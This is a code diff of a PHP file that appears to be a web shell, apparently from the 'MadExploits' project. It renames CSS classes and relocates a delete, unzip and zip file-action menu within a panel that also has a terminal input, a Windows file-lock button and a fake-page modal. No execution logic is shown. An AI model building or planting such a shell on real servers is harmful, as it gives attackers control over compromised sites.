@@ -477,7 +477,7 @@ if ($_GET['don'] == true) {
             border-radius: 4px
         }
 
-        .bc-,
+        .bc-R10T,
         .mail,
         .terminal-input {
             background-color: #000e28;
@@ -518,7 +518,7 @@ if ($_GET['don'] == true) {
             margin: 5px 0
         }
 
-        .bc- {
+        .bc-R10T {
             border: none;
             padding: 7px 10px;
             width: 712px;
@@ -578,15 +578,6 @@ if ($_GET['don'] == true) {
             <li><a href="" class="btn-submit" id="lock-windows">Lock File Windows</a></li>
             <li><a href="//github.com/MadExploits/" class="btn-submit">README</a></li>
             <li><a href="?d=<?= hx($fungsi[0]()) ?>&logout=True" class="btn-submit">LOGOUT!</a></li>
-            <li>
-        <select name="R10T-select" class="btn-submit">
-            <option value="delete">Delete</option>
-            <option value="unzip">Unzip</option>
-            <option value="zip">Zip</option><br>
-        </select>
-        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 5px 20px;">
-        </form>
-        </ul>
         </li>
     </div>
 
@@ -675,6 +666,14 @@ if ($_GET['don'] == true) {
                     <?php endforeach; ?>
                 </tbody>
         </table>
+        <br>
+        <select name="R10T-select" class="btn-submit">
+            <option value="delete">Delete</option>
+            <option value="unzip">Unzip</option>
+            <option value="zip">Zip</option><br>
+        </select>
+        <input type="submit" name="submit-action" value="Submit" class="btn-submit" style="padding: 5px 20px;">
+        </form>
 
 
         <!-- Modal Pop Jquery Create Folder/File By ./MrMad -->
@@ -725,7 +724,6 @@ if ($_GET['don'] == true) {
             </div>
         </div>
     <?php endif; ?>
-    </div>
     <?php if (isset($_GET['fakepage'])) : ?>
         <div class="modal active">
             <div class="modal-container">
